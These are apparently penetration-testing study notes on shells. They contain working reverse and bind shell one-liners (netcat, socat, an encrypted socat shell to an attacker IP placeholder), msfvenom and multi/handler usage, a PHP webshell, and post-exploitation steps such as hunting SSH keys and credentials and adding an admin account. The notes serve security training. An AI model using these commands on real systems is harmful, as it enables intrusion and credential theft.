### **I. What is a Shell?**

- **Purpose:** A shell is a program that provides an interface for interacting with a command-line environment (CLI). It allows you to execute commands, run programs, and manage the operating system.
- **Examples:**
    - Linux: `bash`, `sh`
    - Windows: `cmd.exe`, `PowerShell`
- **In Penetration Testing:** After exploiting a vulnerability, attackers often aim to obtain a shell on the target system to gain further access and control.
### **II. Reverse vs. Bind Shells:**

- **Reverse Shell:** The target system initiates a connection back to the attacker's machine. This is useful for bypassing firewalls that restrict incoming connections.
- **Bind Shell:** The target system listens for a connection from the attacker on a specific port. This is easier to set up but may be blocked by firewalls.
### **III. Tools for Shells:**

- **Netcat:** A versatile networking tool for various tasks, including creating shells. Netcat shells are often unstable but can be improved.
- **Socat:** More powerful than Netcat, but with more complex syntax. Socat shells are generally more stable.
- **Metasploit `multi/handler`:** A Metasploit module for receiving reverse shells. It provides stable shells and supports advanced features like Meterpreter.
- **Msfvenom:** A Metasploit tool for generating payloads, including reverse and bind shells, in various formats.
- **Payloads All The Things:** A repository of shellcodes and payloads in various languages.
- **PentestMonkey Reverse Shell Cheatsheet:** Provides a collection of reverse shell one-liners.
- **SecLists:** A repository of wordlists and shellcode.
### **IV. Shell Types:**

- **Interactive:** Allows interaction with programs after execution (e.g., SSH login).
- **Non-Interactive:** Limited to non-interactive commands (most basic reverse/bind shells).
### **V. Netcat Shells:**

- **Reverse Shell Listener:** `nc -lvnp <port-number>`
    - `-l`: Listen mode.
    - `-v`: Verbose output.
    - `-n`: Don't resolve hostnames.
    - `-p`: Specify port.
- **Bind Shell Connection:** `nc <target-ip> <chosen-port>`
- **Stabilizing Netcat Shells:**
    - **Python:** `python -c 'import pty;pty.spawn("/bin/bash")'`, `export TERM=xterm`, `Ctrl+Z`, `stty raw -echo; fg` (Linux only).
    - **rlwrap:** `rlwrap nc -lvnp <port>` (Provides history, tab completion, arrow keys).
    - **Socat:** Use an initial Netcat shell to upload a statically compiled Socat binary, then use Socat for a more stable shell.
### **VI. Socat Shells:**

- **Reverse Shell Listener:** `socat TCP-L:<port> -`
- **Bind Shell Listener (Linux):** `socat TCP-L:<PORT> EXEC:"bash -li"`
- **Bind Shell Listener (Windows):** `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
- **Stable Linux TTY Reverse Shell:**
    - **Listener:** `socat TCP-L:<port> FILE:`tty`,raw,echo=0`
    - **Connection:** `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
### **VII. Encrypted Shells with Socat:**

- **Generate Certificate:** `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
- **Merge Certificate and Key:** `cat shell.key shell.crt > shell.pem`
- **Reverse Shell Listener:** `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
- **Reverse Shell Connection:** `socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
### **VIII. Common Payloads:**

- **Netcat Bind Shell Listener:** `nc -lvnp <PORT> -e /bin/bash` (some versions)
- **Netcat Bind Shell Listener (without `-e`):** `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
### **IX. Msfvenom:**

- **Purpose:** Generates payloads for various purposes, including reverse/bind shells and Meterpreter.
- **Syntax:** `msfvenom -p <PAYLOAD> <OPTIONS>`
- **Options:**
    - `-f`: Output format (e.g., `exe`, `elf`, `asp`, `php`).
    - `-o`: Output file.
    - `LHOST`: Attacker's IP address.
    - `LPORT`: Listening port.
- **Payload Naming:**
    - `<OS>/<arch>/<payload>` (e.g., `linux/x86/shell_reverse_tcp`)
    - Staged payloads use `/` (e.g., `windows/x64/shell/reverse_tcp`).
    - Stageless payloads use `_` (e.g., `windows/x64/shell_reverse_tcp`).
- **Meterpreter:** Metasploit's advanced payload for post-exploitation.
- **Listing Payloads:** `msfvenom --list payloads`
### **X. Multi/Handler:**

- **Purpose:** Catches reverse shells and Meterpreter payloads.
- **Usage:**
    1. `use exploit/multi/handler`
    2. `set PAYLOAD <payload>`
    3. `set LHOST <listen-address>`
    4. `set LPORT <listen-port>`
    5. `exploit -j` (run in the background)
### **XI. Webshells:**

- **Purpose:** Scripts that run within a webserver to execute commands.
- **Example (PHP):** `<?php echo "<pre>". shell_exec($_GET["cmd"]). "</pre>";?>`
- **Locations:**
    - Kali: `/usr/share/webshells`
    - PayloadsAllTheThings
    - PentestMonkey
### **XII. Post-Exploitation:**

- **Linux:**
    - Look for SSH keys (`/home/<user>/.ssh`).
    - Search for credentials.
    - Exploit vulnerabilities to gain SSH access.
- **Windows:**
    - Check the registry for service passwords.
    - Look for credential files (e.g., FileZilla).
    - Add a new user account with administrative privileges.
